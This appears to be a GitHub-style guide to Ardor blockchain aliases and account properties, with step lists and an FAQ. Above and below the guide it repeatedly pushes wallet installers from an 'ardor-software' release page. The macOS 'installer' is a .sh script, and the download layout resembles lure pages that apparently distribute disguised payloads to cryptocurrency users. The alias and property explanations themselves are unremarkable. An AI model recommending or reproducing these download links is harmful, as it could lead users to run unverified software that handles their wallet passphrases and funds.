![Ardor Wallet guide](assets/banner-article.png)

# Ardor aliases and account properties explained

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

An alias is a name registered on the Ardor chain that points at a value - usually an account address - so people can send to a readable name instead of a long string. Account properties are named fields attached to an account, used to publish information about who or what the account is.

## What an alias is

Think of an alias as a directory entry written into the blockchain. You choose a name, pay a [fee](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/why-an-ardor-transaction-stays-unconfirmed.md), and the name becomes resolvable by anyone: the wallet can look it up and fill in the address it points at.

Because it lives on [chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md), an alias is public and permanent enough to be useful as an identity handle. It is also, for the same reason, impossible to quietly correct: a name registered by mistake stays registered, and the address it points at can only be changed by its owner.

## Creating an alias

1. Open the wallet and unlock the [Ardor account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) that will own the alias.
2. Choose the alias feature and enter the name you want. Shorter, memorable names are contested.
3. Set the value the alias points at - normally your account address.
4. Review the fee and confirm the transaction.
5. Check that the alias resolves, and tell people the name rather than the address.

Step five is the point of the exercise. An alias nobody knows about saves nobody any typing, so publishing it is part of the job rather than an afterthought - and checking it resolves is the difference between a name that works and a name that merely exists.

## What account properties are

Account properties are named fields on an account: a key and a value, both set by the account's owner. They do not change how the account works. They exist so an account can state something about itself in a place that anyone can read.

Typical uses are a display name, a website or contact reference, or a note about what the account is for. Because they are on chain, they are public; nothing private belongs in a property.

## Setting a property

1. Unlock the account on the [Ardor passphrase](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-you-reset-an-ardor-passphrase.md) tab.
2. Open the account properties control.
3. Enter a property name and its value.
4. Confirm the transaction and pay the fee.
5. Re-read the property afterwards to confirm it recorded what you intended.

Properties can be updated later by the owner, which makes them more forgiving than aliases: a wrong value is a correction rather than a permanent mistake, and a stale one can be replaced without registering anything new. The cost is that a reader cannot assume a property is unchanged since they last saw it.

## Where the two are useful

The clearest case is a project or a service that receives payments. An alias gives people a name to send to, and properties let the account state what it is and where its instructions live, without a website being the only record.

For an individual, an alias is mostly a convenience and a small piece of public identity. It is worth having if you receive payments regularly; it is not worth registering a name you will never mention, and it is not a substitute for sending the address itself when accuracy matters more than readability.

## What they do not do

Neither feature adds security. An alias does not prove that the name belongs to the person you think, because anyone can register a similar name. Properties do not verify anything; they are assertions by the owner, not attestations by a third party.

That is the trap with any on-chain naming scheme. The chain records what was claimed, not whether the claim is true, so a name that looks convincing is evidence of a registration fee and nothing more.

## Choosing a name worth registering

A short, pronounceable name is easier to say and easier to mistype. A longer name that includes the project's full identifier is harder to imitate but harder to read aloud.

Most people overestimate how often anyone will type an alias. If the name appears on a payment page and in one or two messages, register something unambiguous and move on; the value is in the destination being correct, not in the name being clever.

## Costs and permanence

Both operations are transactions, so both cost a fee on the chain where they are performed. Aliases are permanent registrations; properties are fields that can be updated by their owner.

Before registering, check the name resolves to the address you expect, and keep a record of what you registered and when. If the alias points at an account you later stop using, update it deliberately rather than leaving a stale destination in place.

## FAQ

### Can I change what an alias points at?

The owner can update the value the alias resolves to. The name itself stays registered to that account.

### Are aliases case sensitive?

Treat names as exact strings and match what the owner published. Similar-looking names can belong to different accounts, which is why an alias is a convenience rather than a guarantee.

### Can I delete an account property?

The owner can update or clear a property they set. Nothing on chain is erased from history, so assume old values remain visible to anyone reading back.

### Do aliases work across child chains?

Aliases are a chain-level feature, so check which chain you are operating on before registering. The wallet shows the selected chain, and the operation happens there.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Create an Ardor account and read its address](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md)
- [Announce a public key in the Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/announce-a-public-key-in-ardor-wallet.md)
- [Ardor child chains explained, including one passphrase for all](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md)
- [Send ARDR to an exchange, clear a malformed recipient, and trace a missing deposit](https://github.com/ardor-software/ardor-wallet-guides/blob/main/send-ardr-from-ardor-wallet-to-an-exchange.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
